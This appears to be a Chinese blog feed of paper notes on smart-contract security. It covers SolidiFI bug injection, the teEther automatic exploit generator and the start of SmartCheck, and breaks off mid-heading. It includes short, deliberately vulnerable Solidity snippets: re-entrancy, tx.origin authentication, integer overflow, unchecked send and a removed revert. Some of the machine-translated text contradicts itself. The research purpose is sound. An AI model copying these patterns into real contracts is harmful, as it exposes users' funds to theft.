exceptions</span><br>&#125;<br></code></pre></td></tr></table></figure><center>Unhandled exceptions</center><h4 id="Integer-overflow-underflow"><a href="#Integer-overflow-underflow" class="headerlink" title="Integer overflow/underflow"></a>Integer overflow/underflow</h4><p>在Solidity中，将值存储在大于或小于其限制的整数变量中会导致整数上溢或下溢。<br>攻击者可以使用它来欺诈地窃取资金。例如，下图显示了一个示例代码片段，其中攻击者可以通过调用函数incrLockTime并传递256作为参数来为用户重置lockTime，这将导致溢出，并最终将lockTime设置为0。==Batch Transfer Overflow==是个真实例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">incrLockTime</span> (<span class="hljs-params"> uint _sec </span>) <span class="hljs-title">public</span> </span>&#123;<br>    lockTime [msg.sender ] += _sec ;<span class="hljs-comment">// Integer overflow</span><br>&#125;<br></code></pre></td></tr></table></figure><center>Integer overflow example</center><h4 id="Use-of-tx-origin"><a href="#Use-of-tx-origin" class="headerlink" title="Use of tx.origin"></a>Use of tx.origin</h4><p>在调用链中，当合同彼此调用函数时，使用tx.origin（返回最初发送调用的第一个调用者）进行身份验证而不是使用msg.sender（返回直接调用者）进行身份验证。导致==phishing-like attacks==类攻击。下图显示了一个示例片段，其中使用tx.origin提取资金</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bug_txorigin</span> (<span class="hljs-params">address _recipient</span>) <span class="hljs-title">public</span> </span>&#123;<br>    <span class="hljs-built_in">require</span> (tx.origin == owner);<br>    _recipient.transfer (<span class="hljs-built_in">this</span>.balance );<br>&#125;<br></code></pre></td></tr></table></figure><center>Use of tx.origin example</center><h4 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h4><p>合同在其接口中公开外部调用。攻击者可以劫持这些外部调用，以多次调用合约本身内的函数，从而在合约本身内执行意外操作。例如，攻击者可以使用图中所示的代码段的第3行中的外部调用来重复调用bug_reEntrancy()函数，从而有可能导致以太币的提取多于用户的余额。 ==DAO攻击[dao 2016]==是利用此bug的一个著名示例。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bug_reEntrancy</span> (<span class="hljs-params"> uint256 _Amt </span>) <span class="hljs-title">public</span> </span>&#123;<br>    <span class="hljs-built_in">require</span> (balances [msg.sender ] &gt;= _Amt );<br>    <span class="hljs-built_in">require</span> (msg.sender.call.value( _Amt )); <span class="hljs-comment">// Re-entrancy</span><br>    balances [msg.sender ] -= _Amt ;<br>&#125;<br></code></pre></td></tr></table></figure><center>Re-entrance example</center><h4 id="Unchecked-send"><a href="#Unchecked-send" class="headerlink" title="Unchecked send"></a>Unchecked send</h4><p>如果外部用户对公众可见，即使他们没有正确的凭据，也可以由外部用户调用未经授权的以太坊传输，例如非零发送。这意味着未经授权的用户可以调用此类功能，并从易受攻击的合同[sol [n.d.]]中转移以太币。下图显示了一个示例代码片段。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bug_unchkSend</span> (<span class="hljs-params"></span>) <span class="hljs-title">payable</span> <span class="hljs-title">public</span> </span>&#123;<br>    msg.sender.transfer (<span class="hljs-number">1</span> ether );<br>&#125;<br></code></pre></td></tr></table></figure><center>Unchecked send example</center><h4 id="Transaction-Ordering-Dependence-TOD"><a href="#Transaction-Ordering-Dependence-TOD" class="headerlink" title="Transaction Ordering Dependence (TOD)"></a>Transaction Ordering Dependence (TOD)</h4><p>TOD bug 是开发人员不应依赖智能合约的状态。</p><p>在具有多次调用合同的单个块中更改交易顺序会导致更改最终输出。<br>恶意矿工可以从中受益。易受此bug攻击的示例代码片段如下图所示。在此示例中，攻击者可以通过在bug_tod1()之前执行bug_tod2()来向自己而不是游戏的赢家发送解决难题的奖励。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">address payable winner_tod ;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setWinner_tod</span> (<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>&#123;<br>    winner_tod = msg.sender ;&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReward_tod</span> (<span class="hljs-params"></span>)<span class="hljs-title">payable</span> <span class="hljs-title">public</span> </span>&#123;<br>    winner_tod.transfer ( msg.value );&#125;<br></code></pre></td></tr></table></figure><center>TOD example</center><h3 id="Bug-injection-challenges"><a href="#Bug-injection-challenges" class="headerlink" title="Bug injection challenges"></a>Bug injection challenges</h3><p>将bug注入智能合约的最简单方法是将它们注入随机位置，但是，随机注入并不是一种经济有效的方法，因为我们必须遵循特定的准则才能使注入的bug可以被利用。确定了两个主要挑战</p><h4 id="Bug-injection-locations"><a href="#Bug-injection-locations" class="headerlink" title="Bug injection locations"></a>Bug injection locations</h4><p>由于某些工具使用的基础技术（例如，符号执行）取决于所分析合约中的控制和数据流，因此将每个Bug的实例注入单个位置是不够的。因此，应将bug注入合同代码中的所有潜在位置。<br>另一方面，确定潜在位置的过程取决于原始合同的代码，还取决于每个错误的类型和性质。</p><h4 id="Semantics-dependency"><a href="#Semantics-dependency" class="headerlink" title="Semantics dependency"></a>Semantics dependency</h4><p>为了使注入的漏洞成为攻击者可以利用的活动漏洞（active bug），必须使其与原始合同的语义保持一致。例如，假设我们要通过调用外部合同来注入拒绝服务（DoS，Denial of Service）Bug。可以将if语句与包含对另一个合约函数的调用的条件一起使用。但是，要执行此错误，我们还需要定义适当的外部合同。 </p><p>SolidiFI通过将Solidity语言==解析为抽象语法树（AST）并将bug注入所有语法有效的位置==来解决第一个挑战。它通过为==每种错误类型制定可利用的代码段==来应对第二个挑战。</p><h3 id="Bug-model"><a href="#Bug-model" class="headerlink" title="Bug model"></a>Bug model</h3><p>SolidiFI执行步骤：</p><ol><li>将安全漏洞的代码段插入所有可能位置的每个智能合约的源代码中,注入位置的选择取决于要注入的漏洞类型。 </li><li>静态分析工具扫描注入的代码。</li><li>检查每个工具的结果，并测量假阴性和假阳性。</li></ol><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201205190103.png" alt="image-20201205190103555"></p><center>SolidiFI Workflow</center><p>SolidiFI从作者准备的预定义可扩展漏洞库中读取要插入的代码段，对于每个工具，仅注入该工具声称可以检测的漏洞类型。</p><ul><li>Code snippets which lead to vulnerabilities</li><li>Injecting bugs claimed to be detected</li><li>Playing the role of developers rather attackers</li><li>Injecting distinct bugs as possible</li></ul><h3 id="Bug-injection"><a href="#Bug-injection" class="headerlink" title="Bug injection"></a>Bug injection</h3><p>通过三种方式将安全漏洞注入源代码。</p><h4 id="Full-code-snippet"><a href="#Full-code-snippet" class="headerlink" title="Full code snippet"></a>Full code snippet</h4><p>为每个漏洞准备了几个代码段。</p><h4 id="Code-transformation"><a href="#Code-transformation" class="headerlink" title="Code transformation"></a>Code transformation</h4><p>这种方法旨在在不更改其功能的情况下转换一段代码，但使其易于受到特定bug的影响。我们利用已知的易受攻击的代码模式来注入此bug。使用这种方法来注入与该方法兼容的两个错误类，即（1）整数上溢/下溢和（2）使用tx.origin。</p><p>表1显示了替换为引入错误的代码模式的示例，以及每种错误类型的易受攻击的模式。</p><center>Table1 Code transformation patterns</center><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201206112723.png" alt="image-20201206112723654"></p><p>图11显示了使用这种方法进行漏洞注入之前和之后的示例。在此示例中，transfer 指令用于在验证sendto()的直接调用方为所有者之后，将指定的以太金额转移到接收者的帐户中。<br>要注入tx.origin错误，应将授权条件 msg.sender == owner 替换为 tx.origin == owner，其中owner不是sendto()的直接调用者。但是，授权检查已成功通过，这使攻击者可以进行自我授权，并从合同发送以太币，即使他们不是所有者。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">/*( Before )*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendto</span> (<span class="hljs-params"> address receiver , uint amount </span>) <span class="hljs-title">public</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">require</span> ( msg.sender == owner );<br>    receiver.transfer ( amount );&#125;<br><span class="hljs-comment">/*( After injection )*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendto</span> (<span class="hljs-params"> address receiver , uint amount </span>) <span class="hljs-title">public</span> </span>&#123;<br>    <span class="hljs-built_in">require</span> (tx.origin == owner);<br>    receiver.transfer (amount);&#125;<br></code></pre></td></tr></table></figure><center>Code transformation example.</center><h4 id="Security-weakening"><a href="#Security-weakening" class="headerlink" title="Security weakening"></a>Security weakening</h4><p>这种方法削弱了智能合约代码中的安全保护机制，可以保护外部调用。我们的目标是评估静态分析工具，而不是智能合约本身。我们使用这种方法来注入未处理的异常错误。<br>下图显示了一个示例，其中通过删除revert()语句（通过该语句在转移交易失败时还原合同状态）来注入未处理的异常bug即使交易失败，余额也会错误地变为0。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">/*( Before )*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdrawBal</span> (<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>&#123;<br>    Balances [ msg . sender ] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (! msg . sender . send ( Balances [ msg . sender ]))&#123; <br>        revert (); &#125;&#125;<br><br><span class="hljs-comment">/*( After injection )*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdrawBal</span> (<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>&#123;<br>    Balances [ msg . sender ] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (! msg . sender . send ( Balances [ msg . sender ]))<br>    &#123; <span class="hljs-comment">// revert (); </span><br>    &#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="SOLIDIFI-ALGORITHM"><a href="#SOLIDIFI-ALGORITHM" class="headerlink" title="SOLIDIFI ALGORITHM"></a>SOLIDIFI ALGORITHM</h3><p>注入漏洞的过程将智能合约的抽象语法树（AST）作为输入，并具有以下步骤：</p><p>1、确定潜在的漏洞注入位置，并生成带注释的AST（annotated AST），标记所有确定的位置。</p><p>2、将bug注入所有标记的位置以生成包含漏洞的合同</p><p>3、使用评估工具检查包含漏洞的合同，并检查结果是否正确检测到漏洞。</p><h4 id="Bug-locations-identification"><a href="#Bug-locations-identification" class="headerlink" title="Bug locations identification"></a>Bug locations identification</h4><p>AST传递给漏洞位置标识符（Bug Locations Identifier），该漏洞标识符为给定的安全漏洞驱动目标合同中所有可能的注入位置的漏洞注入配置文件（BIP，bug injection profile）。</p><p>使用基于AST的分析通过算法1来识别智能合约代码中的潜在注入位置，从而得出BIP。</p><p>算法1将AST和要注入的漏洞类型作为输入，并输出BIP。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201206114121.png" alt="image-20201206114121170"></p><p>bugs 采取两种形式：单独的语句和语句块。</p><p>语句块可以定义为独立功能，也可以定义为非功能块，例如”if”语句。因此，对于每种形式的错误，都使用一个规则，该规则定义了注入错误的位置。</p><p>为了识别这样的位置，对于定义要注入的错误类型的每种不同形式的代码片段，我们根据代码片段形式和相关规则（算法1中的2-10行）遍历AST.WalkAST（simpleStatement），例如，将解析AST，并找到可以在不使合同的编译状态无效的情况下插入简单语句的所有位置，对于其他形式的错误类型的代码段也是如此。在确定了注入错误代码段的位置之后，我们还将寻==找削弱现有安全机制以引入相关错误的方法，并寻找要转换以引入缺陷的代码模式==（第11和12行）。</p><p>After identifying the locations for injecting code snippets of bugs, we also look for existing security mechanisms to be weakened to introduce the related bug, and the code patterns to<br>be transformed for introducing the bug (lines 11 and 12).</p><h4 id="Bug-injection-and-code-transformation"><a href="#Bug-injection-and-code-transformation" class="headerlink" title="Bug injection and code transformation"></a>Bug injection and code transformation</h4><p>SolidiFI使用系统的方法将错误注入目标合同中的潜在位置。错误注入器模型会为BIP中指定的每个位置播种错误。它使用基于文本的代码转换来修改代码，其中从AST派生的信息用于修改代码以注入错误。使用了三种不同的方法来注入错误。除了在目标合同中注入错误之外，Bug Injector还会生成一个BugLog，该BugLog为每个注入的bug指定唯一的标识符，并在目标合同中将其注入的对应位置指定一个或多个。</p><h4 id="Buggy-code-check-and-results-inspection"><a href="#Buggy-code-check-and-results-inspection" class="headerlink" title="Buggy code check and results inspection"></a>Buggy code check and results inspection</h4><p>生成的带漏洞合同将传递到工具评估器，后者使用评估中的工具检查越野车代码。<br>然后，在Bug Injector生成的BugLog的帮助下，扫描由工具生成的结果以查找已注入但未被检测到的bug。 SolidiFI仅考虑未检测到的注入错误。因此，如果经过评估的工具在注入错误的位置以外的其他位置报告了错误，则SolidiFI不会在其误报输出中考虑这些错误。这是为了避免SolidiFI报告原始合同中的潜在漏洞，从而使结果不正确。此外，SolidiFI会检查由工具生成的结果，以查找其他报告的错误，并检查它们是否为真正的错误或错误警报。</p><h2 id="三、实验评估"><a href="#三、实验评估" class="headerlink" title="三、实验评估"></a>三、实验评估</h2><p>在我们的实验中，我们使用了从50种智能合约中选择的数据集，这些智能合约从具有不同大小和不同连接能力的扫描中选择，实际上这些合约代表了兴趣，而在我们的研究中，我们回答了这三个研究问题，分别是假阴性和假阳性</p><h3 id="Evaluation"><a href="#Evaluation" class="headerlink" title="Evaluation"></a>Evaluation</h3><ul><li>6 static analysis tools<br>(Oyente, Securify,Mythril, Smartcheck,Manticore,Slither)</li><li>50 Smart Contracts representative of Etherscan (39-741 loc) ~Most Etherscancontracts size &lt;1000 loc</li><li>Different functionalities and syntactic elements</li></ul><p>RQ1: False negatives of the evaluated tools?</p><p>RQ2: False positives of the evaluated tools?</p><p>RQ3: Injected bugs can be activated?</p><h3 id="setup"><a href="#setup" class="headerlink" title="setup"></a>setup</h3><ul><li>7 common bug classesconsidered by the tools</li><li>9,369 distinct bugs</li><li>Timeout: 15 minutes persmart contract</li></ul><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201205184313.png" alt="image-20201205184313316"></p><h3 id="RQ1-False-negatives-of-the-evaluated-tools"><a href="#RQ1-False-negatives-of-the-evaluated-tools" class="headerlink" title="RQ1: False negatives of the evaluated tools?"></a>RQ1: False negatives of the evaluated tools?</h3><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201205184258.png" alt="image-20201205184258116"></p><ul><li><p>None of the tools detect all bugs</p></li><li><p>Many undetectedcorner cases</p></li><li><p>Misidentification is high as well</p></li></ul><h3 id="RQ2-False-positives-of-the-evaluated-tools"><a href="#RQ2-False-positives-of-the-evaluated-tools" class="headerlink" title="RQ2: False positives of the evaluated tools?"></a>RQ2: False positives of the evaluated tools?</h3><h4 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges:"></a>Challenges:</h4><ul><li>Lack of ground truth</li><li>Large number of bugs</li></ul><h4 id="Approach"><a href="#Approach" class="headerlink" title="Approach:"></a>Approach:</h4><p>为了使确定假阳性的问题易于处理，我们提出了以下方法。主要思想是仅手动检查每个智能合约的大多数其他工具未报告的错误。保守地假设==大多数工具报告的错误不能为假阳性==。<br>对于每种工具，我们随机选择了大多数方法未排除的每种错误类型类别的20个错误，并手动对其进行了检查。对于那些错误数量小于或等于20的情况，我们进行了全部检查。</p><p>假设一个工具报告的错误总数为100。在这100个错误中，我们假设大多数其他智能合约工具也报告了60个错误，因此我们将其排除在外。在剩下的40个经过过滤的错误中，我们手动检查了随机选择的20个错误。假设其中16个确实为假阳性。过滤掉的错误中有80％是假阳性，并且估计假阳性的数量为32。</p><ul><li>Assuming a bug reported by the majority of the tools cannot be false positive</li></ul><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201205185024.png" alt="image-20201205185024364"></p><p>在表中：</p><ul><li>Threshold：表示多数阈值，即必须检测该错误才能将其排除在外的工具数量，此数量取决于能够检测到该错误类型的工具数量</li><li><code>Reported</code>显示该工具报告的错误数量</li><li>子列<code>FIL</code>显示已通过多数方法过滤（但不排除）的错误数量</li><li>子列<code>FP</code>显示了基于上述人工检查的工具的误报。</li><li>「miscellaneous」：某些工具检测到7类之外的错误</li></ul><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201206160927.png" alt="image-20201206160927503"></p><h3 id="RQ3-Injected-bugs-can-be-activated"><a href="#RQ3-Injected-bugs-can-be-activated" class="headerlink" title="RQ3: Injected bugs can be activated?"></a>RQ3: Injected bugs can be activated?</h3><p>由于存在大量未检测到的错误，从不同的合同中为每种错误类型随机选择了5个未检测到的错误，以测试它们的激活。<br>表6显示了我们激活实验的结果。在表中“ –”表示我们无法对该错误类型进行实验，因为它要求攻击者充当矿工，这将消耗大量的计算资源。<br>结果表明，人们可以利用（激活）其相关带有漏洞的合同中的所有选定错误。因此，激活错误（the infeasibility of activation）是不可行的，并不是评估工具无法检测到注入的错误的原因。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201206162235.png" alt="image-20201206162235814"></p><h2 id="四、总结评价"><a href="#四、总结评价" class="headerlink" title="四、总结评价"></a>四、总结评价</h2><p>1、本文主要贡献发现当前的静态分析工具依然仍然不成熟，并且假阴性（false negatives，FN）和假阳性（FP，false positives）的数量过高，这个跟之前的SmartBugs的工作类似，不过是采取的另一种方法。</p><p>2、提出了一种系统性注入漏洞的方法：SolidifI</p>]]></content>
    
    
    <categories>
      
      <category>智能合约</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Smart Contract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>teEther: Gnawing at Ethereum to Automatically Exploit Smart Contracts</title>
    <link href="/2020/126557f196.html"/>
    <url>/2020/126557f196.html</url>
    
    <content type="html"><![CDATA[<h1 id="2020-12-12-TEETHER"><a href="#2020-12-12-TEETHER" class="headerlink" title="2020.12.12 TEETHER"></a>2020.12.12 TEETHER</h1><p>论文题目：(2018-USENIX) <a href="https://www.usenix.org/conference/usenixsecurity18/presentation/krupp">teEther: Gnawing at Ethereum to Automatically Exploit Smart Contracts</a></p><p>论文引用：Krupp J, Rossow C. teether: Gnawing at ethereum to automatically exploit smart contracts[C]//27th {USENIX} Security Symposium ({USENIX} Security 18). 2018: 1317-1333.</p><h2 id="一、主要内容"><a href="#一、主要内容" class="headerlink" title="一、主要内容"></a>一、主要内容</h2><p>作者在通用定义易受攻击合同的定义之后，TEETHER可以在允许仅在给定二进制字节码的情况下进行智能合约的自动漏洞识别和漏洞利用能力。对所有38,757个独特的以太坊合约进行了大规模分析，并在其中815个合约中找到了完全自动化的工作漏洞。<br>他们对于合同漏洞的定义基于以下观察：从一个账户（合同）到另一个账户的价值转移只能在少数明确的条件下进行。 特别是，他们确定了价值转移中必然涉及的四个关键的低级EVM指令：一个用于创建常规事务（CALL），一个用于合同终止（SELFDESTRUCT），两个用于代码注入（CALLCODE） ，DELEGATECALL）。<br>研究人员提出了一种方法，用于在合同中查找易受攻击的执行跟踪，并使用符号执行来自动创建漏洞利用。 具体方法如下为在合同的控制流程图中搜索某些关键路径。具体来说，我们确定了导致关键指令的路径，其中指令的参数可以由攻击者控制。找到路径后，我们利用符号执行将此路径转换为一组约束。 使用约束求解，我们可以推断出攻击者必须执行的事务才能触发漏洞。<br>本文的主要贡献在于：</p><ol><li>基于低级EVM指令提供易受攻击合同的通用定义。</li><li>开发了一个工具TEETHER，它仅从合约的字节码提供端到端漏洞利用。 为此，他们解决了几个特定于EVM的挑战，例如象征性地处理哈希值的新方法</li><li>提供了从以太坊区块链中提取的38,757个独特合约的大规模脆弱性分析。</li></ol><h2 id="二、设计实现"><a href="#二、设计实现" class="headerlink" title="二、设计实现"></a>二、设计实现</h2><p> TEETHER工具流程如下图所示</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210412122545.png" alt="TEETHER工具流程图"><br>（1） CFG（控制流程图）的重建<br>TEETHER使用反向切片来迭代地重建CFG。选择未解析的JUMP或JUMPI，并计算其跳转目标的（路径敏感的）后向切片的集合。如果可以找到完整的后向切片，则执行它以计算跳转目标，将新找到的边添加到CFG，并将相应的跳转指令标记为已解决。由于引入新边缘可能导致新连接的子树内可能出现新的反向跳跃切片，因此该子树中的所有JUMP和JUMPI指令再次标记为未解析。重复此过程，直到找不到新的边缘并且所有跳转指令都标记为已解决。</p><p><img src="https://img-blog.csdn.net/20180904135634245" alt="这里写图片描述"></p><p>（2） 关键指令<br>    我们确定了四条关键的EVM指令，想从合约中提取以太网必须至少执行其中一条。 这四条指令分为两类：两条指令导致直接传输，两条指令允许在契约的上下文中执行任意以太网字节码。前两条为CALL和SELFDESTRUCT，后两条为 CALLCODE和DELEGATECALL指令。<br>（3） 路径生成<br>    为了找到关键路径，TEETHER使用A *探索路径，其中路径的成本被定义为该路径在CFG中遍历的分支数。为了仅关注关键路径，在每个步骤之后，我们检查是否仍然可以从当前路径到达至少一个关键切片的所有剩余指令。如果不能完全到达关键切片，则丢弃对路径的进一步探索<br>（4） 生成约束<br>    约束生成模块与路径生成同步运行。 一旦找到路径，路径约束生成模块就尝试以符号方式执行路径以便收集一组路径约束。<br>（5） 路径拼接<br>    将n状态变化路径与关键路径的收集路径约束C收集存储读取R和写入W合并，得到下一变化路径。具体如下</p><p><img src="https://img-blog.csdn.net/20180904135801156" alt="这里写图片描述"></p><p>（6） 利用漏洞<br>    如果找到具有可满足的组合路径约束的路径序列，则该模块将输出导致智能合约利用的事务列表。<br>    为了证明文中的方法的实用性，研究人员最终对从区块链中提取的38,757个独特合同进行了大规模分析。 TEETHER发现815（2.10％）的漏洞 完全自动化，无需人工干预或手动验证，也不需要合同源代码。 由于代码共享，这使得至少1,731个账户的资金面临风险。 此外，一个案例研究表明，许多潜在的漏洞是由Solidity的设计选择和对EVM执行模型的误解造成的。</p><h2 id="三、总结评价"><a href="#三、总结评价" class="headerlink" title="三、总结评价"></a>三、总结评价</h2><p>优点：</p><ol><li>TEETHER成功地对使用这些合同的以太坊账户产生了1,564个工作漏洞</li><li>本文提出了一个通用漏洞定义，可以被一个弱的多的攻击者利用，不局限于恶意矿工。有的工具只能检测漏洞，该工具不仅能检测漏洞，还能自动的利用漏洞。</li></ol><p>缺点：</p><ol><li>TEETHER目前只侧重于在检查合约内的漏洞，但事实上，合约可能会调用其他合约产生漏洞。</li><li>搜索漏洞时，文中的评估会将合同的存储初始化为空状态。这使他们能够结合共享相同代码的合约进行分析，并将工具运行次数从784,344减少到38,757次。但是，这是以不精确的结果为代价的。</li><li>文中的漏洞研究只是在本地测试平台中，有些漏洞在真实的以太坊区块链中不存在。   </li></ol>]]></content>
    
    
    <categories>
      
      <category>智能合约</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Smart Contract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Smartcheck: Static analysis of ethereum smart contracts</title>
    <link href="/2020/11fdfc0192.html"/>
    <url>/2020/11fdfc0192.html</url>
    
    <content type="html"><![CDATA[<h1 id="Smartcheck-Static-analysis-of-ethereum-smart-contracts"><a href="#Smartcheck-Static-analysis-of-ethereum-smart-contracts" class="headerlink" title="Smartcheck: Static analysis of ethereum smart contracts"></a>Smartcheck: Static analysis of ethereum smart contracts</h1><p>论文题目：(2018-WETSEB)<a href="https://dl.acm.org/doi/abs/10.1145/3194113.3194115">Smartcheck: Static analysis of ethereum smart contracts</a>——以太坊智能合约的静态分析</p><p>论文引用：Tikhomirov S, Voskresenskaya E, Ivanitskiy I, et al. Smartcheck: Static analysis of ethereum smart contracts[C]//Proceedings of the 1st International Workshop on Emerging Trends in Software Engineering for Blockchain. 2018: 9-16.</p><p>工具开源： <a href="https://github.com/smartdec/smartcheck">smartdec/smartcheck: SmartCheck </a></p><h2 id="一、主要内容"><a href="#一、主要内容" class="headerlink" title="一、主要内容"></a>一、主要内容</h2><p>提供了solidity的一个全面代码问题分类。此外，还完善了一个用于检测他们的扩展静态分析工具SmartCheck。</p><p>SmartCheck 将 Solidity代码转化为基于xml的中间表示式，然后根据XPath模式对其进行对比检查。通过一个现实世界中的大合约数据样本对此工具进行了评估，之后将其结果和人工审计下的三个合约结果进行比较。</p><h3 id="Security-issues"><a href="#Security-issues" class="headerlink" title="Security issues"></a>Security issues</h3><h4 id="Balance-equality"><a href="#Balance-equality" class="headerlink" title="Balance equality"></a>Balance equality</h4><p>避免对余额进行严格的相等检查。攻击者可以通过挖矿或者自毁向任意账户发送ether。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.balance == <span class="hljs-number">42</span> ether) &#123; <span class="hljs-comment">/* ... */</span>&#125; <span class="hljs-comment">// bad</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.balance &gt;= <span class="hljs-number">42</span> ether) &#123; <span class="hljs-comment">/* ... */</span>&#125; <span class="hljs-comment">// good</span><br></code></pre></td></tr></table></figure><h4 id="Unchecked-external-call"><a href="#Unchecked-external-call" class="headerlink" title="Unchecked external call"></a>Unchecked external call</h4><p>无检查的外部调用：当发送ether时，检查返回值并处理发生的错误才是正确的做法。推荐的方法是用transfer来发送ether。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">addr.send (<span class="hljs-number">42</span> ether); <span class="hljs-comment">// bad</span><br><span class="hljs-keyword">if</span> (! addr.send (<span class="hljs-number">42</span> ether)) revert; <span class="hljs-comment">// better</span><br>addr.transfer (<span class="hljs-number">42</span> ether); <span class="hljs-comment">// good</span><br></code></pre></td></tr></table></figure><h4 id="DoS-by-external-contract"><a href="#DoS-by-external-contract" class="headerlink" title="DoS by external contract"></a>DoS by external contract</h4><p>条件语句不应该依赖于外部调用。如不这样，被调用方也许会永远被调用失败，以至于组织调用方完成全部执行。例子如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dos</span>(<span class="hljs-params">address oracleAddr</span>) <span class="hljs-title">public</span> </span>&#123;<br>badOracle = Oracle(oracleAddr);<br><span class="hljs-keyword">if</span> (badOracle.answer () &lt; <span class="hljs-number">42</span>) &#123; revert; &#125;<br><span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="send-instead-of-transfer"><a href="#send-instead-of-transfer" class="headerlink" title="send instead of transfer"></a>send instead of transfer</h4><p>完成ether支付的推荐方法是send</p><p>Re-entrancy</p><p>重入漏洞</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">pragma solidity <span class="hljs-number">0.4</span><span class="hljs-number">.19</span>;<br>contract Fund &#123;<br>mapping(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint) balances;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span> (<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>&#123;<br><span class="hljs-keyword">if</span> (msg.sender.call.value(balances[msg.sender ])())<br>balances[msg.sender] = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Malicious-libraries"><a href="#Malicious-libraries" class="headerlink" title="Malicious libraries"></a>Malicious libraries</h4><p> 恶意的库：第三方库可能是恶意的。避免外部依赖或确保第三方代码只包含预期的功能。该模式只是检测library关键字</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br></code></pre></td></tr></table></figure><h4 id="Using-tx-origin"><a href="#Using-tx-origin" class="headerlink" title="Using tx.origin"></a>Using 